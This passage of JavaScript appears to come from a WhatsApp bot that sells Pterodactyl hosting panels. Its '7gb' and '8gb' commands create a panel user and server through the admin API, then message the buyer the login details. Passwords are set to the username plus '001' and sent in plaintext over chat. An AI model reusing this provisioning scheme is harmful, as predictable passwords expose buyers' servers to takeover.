*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "200"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "8gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "254"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏